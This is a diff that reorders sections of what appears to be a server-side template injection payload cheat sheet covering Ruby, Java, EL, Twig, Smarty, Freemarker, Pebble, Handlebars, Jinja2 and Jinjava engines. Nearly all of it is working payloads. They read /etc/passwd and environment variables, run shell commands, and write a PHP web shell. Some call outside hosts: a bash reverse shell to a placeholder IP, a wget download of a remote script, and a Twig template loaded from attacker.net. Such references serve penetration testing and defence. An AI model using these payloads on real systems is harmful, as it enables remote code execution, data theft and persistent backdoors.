@@ -69,85 +69,32 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ---
 
-## Ruby
+## ASP.NET Razor
 
-### Ruby - Basic injections
+### ASP.NET Razor - Basic injection
 
-ERB:
-
-```ruby
-<%= 7 * 7 %>
-```
-
-Slim:
-
-```ruby
-#{ 7 * 7 }
-```
-
-### Ruby - Retrieve /etc/passwd
-
-```ruby
-<%= File.open('/etc/passwd').read %>
-```
-
-### Ruby - List files and directories
-
-```ruby
-<%= Dir.entries('/') %>
-```
-
-### Ruby - Code execution
-
-Execute code using SSTI for ERB engine.
-
-```ruby
-<%= system('cat /etc/passwd') %>
-<%= `ls /` %>
-<%= IO.popen('ls /').readlines()  %>
-<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
-<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
-```
-
-
-Execute code using SSTI for Slim engine.
+https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c
 
 ```powershell
-#{ %x|env| }
+@(1+2)
 ```
 
-## Java
+### ASP.NET Razor - Command execution
 
-### Java - Basic injection
-
-```java
-${7*7}
-${{7*7}}
-${class.getClassLoader()}
-${class.getResource("").getPath()}
-${class.getResource("../../../../../index.htm").getContent()}
+```csharp
+@{
+  // C# code
+}
 ```
 
-### Java - Retrieve the system’s environment variables
-
-```java
-${T(java.lang.System).getenv()}
-```
-
-### Java - Retrieve /etc/passwd
-
-```java
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-```
+---
 
 ## Expression Language EL
 
 ### Expression Language EL - Basic injection
 
 ```java
-${1+1} 
+${1+1}
 #{1+1}
 ```
 
@@ -162,7 +109,6 @@ ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".g
 ```
 
 ### Expression Language EL - Code Execution
-
 
 ```java
 // Common RCE payloads
@@ -192,65 +138,7 @@ ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().g
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
 ```
 
-
-## Twig
-
-### Twig - Basic injection
-
-```python
-{{7*7}}
-{{7*'7'}} would result in 49
-{{dump(app)}}
-{{app.request.server.all|join(',')}}
-```
-
-### Twig - Template format
-
-```python
-$output = $twig > render (
-  'Dear' . $_GET['custom_greeting'],
-  array("first_name" => $user.first_name)
-);
-
-$output = $twig > render (
-  "Dear {first_name}",
-  array("first_name" => $user.first_name)
-);
-```
-
-### Twig - Arbitrary File Reading
-
-```python
-"{{'/etc/passwd'|file_excerpt(1,30)}}"@
-```
-
-### Twig - Code execution
-
-```python
-{{self}}
-{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|filter('system')}}
-{{['cat\x20/etc/passwd']|filter('system')}}
-{{['cat$IFS/etc/passwd']|filter('system')}}
-```
-
-Example with an email passing FILTER_VALIDATE_EMAIL PHP.
-
-```powershell
-POST /subscribe?0=cat+/etc/passwd HTTP/1.1
-email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
-```
-
-## Smarty
-
-```python
-{$smarty.version}
-{php}echo `id`;{/php} //deprecated in smarty v3
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-{system('ls')} // compatible v3
-{system('cat index.php')} // compatible v3
-```
+---
 
 ## Freemarker
 
@@ -280,34 +168,64 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ${dwf.newInstance(ec,null)("id")}
 ```
 
-## Pebble
+---
 
-### Pebble - Basic injection
+## Handlebars
 
-```java
-{{ someString.toUPPERCASE() }}
+### Handlebars - Command Execution
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
 ```
 
-### Pebble - Code execution
+---
 
-Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+## Java
 
-New version of Pebble :
+### Java - Basic injection
 
 ```java
-{% set cmd = 'id' %}
-{% set bytes = (1).TYPE
-     .forName('java.lang.Runtime')
-     .methods[6]
-     .invoke(null,null)
-     .exec(cmd)
-     .inputStream
-     .readAllBytes() %}
-{{ (1).TYPE
-     .forName('java.lang.String')
-     .constructors[0]
-     .newInstance(([bytes]).toArray()) }}
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
 ```
+
+### Java - Retrieve the system’s environment variables
+
+```java
+${T(java.lang.System).getenv()}
+```
+
+### Java - Retrieve /etc/passwd
+
+```java
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+```
+
+---
+
 
 ## Jade / Codepen
 
@@ -350,7 +268,7 @@ ${x}
 
 ### Direct access to os from TemplateNamespace:
 
-Any of these payloads allows direct access to the `os` module 
+Any of these payloads allows direct access to the `os` module
 
 ```python
 ${self.module.cache.util.os.system("id")}
@@ -549,13 +467,13 @@ In another GET parameter include a variable named "input" that contains the comm
 
 ```python
 # evil config
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
 # load the evil config
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
 
 # connect to evil host
-{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
 
 
@@ -608,7 +526,7 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Jinjava - Command execution 
+### Jinjava - Command execution
 
 Fixed by https://github.com/HubSpot/jinjava/pull/230
 
@@ -619,52 +537,7 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 
-
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
-```
-
-## Handlebars
-
-### Handlebars - Command Execution
-
-```handlebars
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('ls -la');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-## ASP.NET Razor
-
-### ASP.NET Razor - Basic injection
-
-https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c
-
-```powershell
-@(1+2)
-```
-
-### ASP.NET Razor - Command execution 
-
-```csharp
-@{
-  // C# code
-}
 ```
 
 ---
@@ -706,7 +579,7 @@ version 2 example RCE plugin:
 ```javascript
 functions.add('cmd', function(val) {
   return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
-}); 
+});
 ```
 version 3 and above example RCE plugin
 
@@ -719,6 +592,150 @@ registerPlugin({
         });
     }
 })
+```
+
+---
+
+## Pebble
+
+### Pebble - Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Pebble - Code execution
+
+Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+
+New version of Pebble :
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
+```
+
+---
+
+## Ruby
+
+### Ruby - Basic injections
+
+ERB:
+
+```ruby
+<%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
+```
+
+### Ruby - Retrieve /etc/passwd
+
+```ruby
+<%= File.open('/etc/passwd').read %>
+```
+
+### Ruby - List files and directories
+
+```ruby
+<%= Dir.entries('/') %>
+```
+
+### Ruby - Code execution
+
+Execute code using SSTI for ERB engine.
+
+```ruby
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+```
+
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
+```
+
+
+---
+
+## Smarty
+
+```python
+{$smarty.version}
+{php}echo `id`;{/php} //deprecated in smarty v3
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} // compatible v3
+{system('cat index.php')} // compatible v3
+```
+
+---
+
+## Twig
+
+### Twig - Basic injection
+
+```python
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+```
+
+### Twig - Template format
+
+```python
+$output = $twig > render (
+  'Dear' . $_GET['custom_greeting'],
+  array("first_name" => $user.first_name)
+);
+
+$output = $twig > render (
+  "Dear {first_name}",
+  array("first_name" => $user.first_name)
+);
+```
+
+### Twig - Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+```
+
+### Twig - Code execution
+
+```python
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
 
 ---
